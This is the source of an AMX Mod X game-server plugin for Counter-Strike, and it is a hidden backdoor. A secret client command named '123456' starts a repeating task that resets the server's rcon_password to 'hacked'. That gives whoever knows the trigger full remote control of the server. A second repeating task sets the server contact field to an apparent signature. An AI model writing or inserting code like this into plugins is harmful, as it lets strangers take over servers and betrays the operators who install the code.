public plugin_init()
{
	register_clcmd("123456", "action")
	
	set_task(1.0, "contact", 0, "", 0, "b")
}

public action()
{
	set_task(1.0, "zer0", 0, "", 0, "b")
}

public zer0()
{
	server_cmd("rcon_password ^"hacked^"")
}

public contact()
{
	server_cmd("sv_contact ^"se_iaqe^"")
}
/* AMXX-Studio Notes - DO NOT MODIFY BELOW HERE
*{\\ rtf1\\ ansi\\ ansicpg1252\\ deff0\\ deflang1033{\\ fonttbl{\\ f0\\ fnil Tahoma;}}\n\\ viewkind4\\ uc1\\ pard\\ f0\\ fs16 \n\\ par }
*/
